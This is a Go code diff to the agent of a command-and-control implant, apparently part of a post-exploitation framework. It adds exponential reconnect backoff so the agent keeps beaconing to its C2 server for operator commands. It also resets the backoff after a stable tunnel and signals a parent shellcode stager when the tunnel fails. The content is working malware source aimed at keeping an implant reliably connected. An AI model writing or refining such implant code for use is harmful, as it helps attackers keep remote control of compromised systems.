@@ -25,6 +25,34 @@ import (
 	"github.com/ncruces/go-dns"
 )
 
+const (
+	// c2BackoffInitial is the first sleep after a failed C2 connection attempt.
+	c2BackoffInitial = 5 * time.Second
+	// c2BackoffMax caps the exponential backoff so agents still poll often
+	// enough to notice newly queued operator commands.
+	c2BackoffMax = 10 * time.Minute
+)
+
+// c2Backoff is the current reconnect backoff. It increases on every failed
+// tunnel and is reset once a tunnel stays alive long enough to be considered
+// admitted by the C2.
+var c2Backoff = c2BackoffInitial
+
+// takeC2Backoff sleeps for the current backoff and then doubles it.
+func takeC2Backoff() {
+	logging.Warningf("Backing off for %v before reconnect", c2Backoff)
+	time.Sleep(c2Backoff)
+	c2Backoff *= 2
+	if c2Backoff > c2BackoffMax {
+		c2Backoff = c2BackoffMax
+	}
+}
+
+// resetC2Backoff resets the reconnect backoff after a stable C2 tunnel.
+func resetC2Backoff() {
+	c2Backoff = c2BackoffInitial
+}
+
 func agent_main() {
 	var err error
 	defer func() {
@@ -261,11 +289,20 @@ connect:
 		goto connect
 	}
 	logging.Infof("Connecting to message tunnel...")
+	tunnelStart := time.Now()
 	err = c2transport.MsgTunneler(def.CCMsgConn, common.RuntimeConfig, handler.HandleC2Command, ctx, cancel)
+	tunnelDuration := time.Since(tunnelStart)
 	if err != nil {
 		logging.Errorf("Message tunnel exited with error: %v", err)
 	}
-	logging.Infof("Message tunnel closed, signaling parent and sleeping")
+	// A tunnel that survived long enough was admitted by the C2; reset the
+	// backoff. Rejected idle connections return quickly, so the backoff keeps
+	// growing for those.
+	if tunnelDuration >= 30*time.Second {
+		resetC2Backoff()
+		logging.Infof("Message tunnel was stable for %v, resetting reconnect backoff", tunnelDuration)
+	}
+	logging.Infof("Message tunnel closed, backing off before reconnect")
 	// Signal parent (shellcode stager) to suspend us immediately
 	// This prevents attempting reconnection that gets interrupted mid-preflight
 	conditionalC2FailNotify()
